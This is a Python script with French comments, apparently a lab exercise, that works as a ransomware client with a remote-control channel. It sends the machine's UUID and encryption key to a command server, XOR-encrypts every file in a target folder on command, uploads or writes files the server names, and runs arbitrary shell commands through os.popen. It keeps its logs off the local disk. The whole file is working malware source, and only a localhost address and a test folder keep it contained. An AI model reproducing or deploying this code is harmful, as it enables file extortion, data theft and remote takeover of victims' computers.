import os
import socket
import time

# --- LOGS DISTANTS (Zéro trace locale) ---
def logger(s, niveau, message):
    horodatage = time.strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"LOG:[{horodatage}] [{niveau}] {message}"
    try:
        s.sendall(log_line.encode('utf-8'))
        time.sleep(0.2) # Temps pour que le serveur traite le log
    except:
        pass

# --- GÉNÉRATION CLÉ / UUID (Identique) ---
def securekey(taille=32):
    caracteres_autorises = "".join(chr(code) for code in range(65, 91))
    cle = ""
    with open("/dev/urandom", "rb") as f:
        while len(cle) < taille:
            octet = f.read(1)
            if not octet: break
            if chr(octet[0]) in caracteres_autorises: cle += chr(octet[0])
    return cle

def recuperer_uuid():
    try:
        with open("/proc/sys/kernel/random/uuid", "r") as f: return f.read().strip()
    except: return "uuid-non-trouve"

# --- MOTEUR XOR ---
def xor_cipher(s, chemin_fichier, cle):
    try:
        with open(chemin_fichier, "rb") as f: donnees = f.read()
        if not donnees: return
        modifiees = bytearray(donnees[i] ^ ord(cle[i % len(cle)]) for i in range(len(donnees)))
        with open(chemin_fichier, "wb") as f: f.write(modifiees)
    except Exception as e:
        logger(s, "ERROR", f"Echec sur {chemin_fichier}: {e}")

def lancer_action(s, repertoire, cle):
    for racine, _, fichiers in os.walk(repertoire):
        for f in fichiers:
            if f == os.path.basename(__file__): continue
            xor_cipher(s, os.path.join(racine, f), cle)

# --- EXECUTION ---
if __name__ == "__main__":
    cle_unique = securekey(32)
    uuid_machine = recuperer_uuid()
    ip_serv, port = '127.0.0.1', 5555
    dossier_test = os.path.expanduser("~/Documents/LABO_TEST")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_serv, port))
        s.sendall(f"{uuid_machine}:{cle_unique}".encode())
        
        if s.recv(1024) == b"OK":
            logger(s, "INFO", "Connexion etablie.")
            
            while True:
                cmd = s.recv(4096).decode('utf-8')
                if not cmd or cmd.lower() == "exit": break
                
                if cmd == "ENCRYPT":
                    logger(s, "WARNING", "Chiffrement en cours...")
                    lancer_action(s, dossier_test, cle_unique)
                    s.sendall(b"[*] ENCRYPT TERMINE")
                
                elif cmd == "DECRYPT":
                    logger(s, "INFO", "Dechiffrement en cours...")
                    lancer_action(s, dossier_test, cle_unique)
                    s.sendall(b"[*] DECRYPT TERMINE")
                
                elif cmd.startswith("UPLOAD "): # Client vers Serveur
                    chemin = cmd.split(" ")[1]
                    try:
                        with open(chemin, "rb") as f:
                            logger(s, "INFO", f"Envoi de {chemin}")
                            s.sendall(f.read())
                    except: s.sendall(b"ERREUR: Fichier introuvable")
                
                elif cmd.startswith("DOWNLOAD "): # Serveur vers Client
                    chemin = cmd.split(" ")[1]
                    s.sendall(b"READY_TO_RECEIVE") # Signal pour le serveur
                    donnees = s.recv(1024*1024)
                    with open(chemin, "wb") as f: f.write(donnees)
                    logger(s, "INFO", f"Telechargement de {chemin} fini.")
                
                else:
                    res = os.popen(cmd).read()
                    s.sendall(res.encode() if res else b"OK")
        s.close()
    except: pass
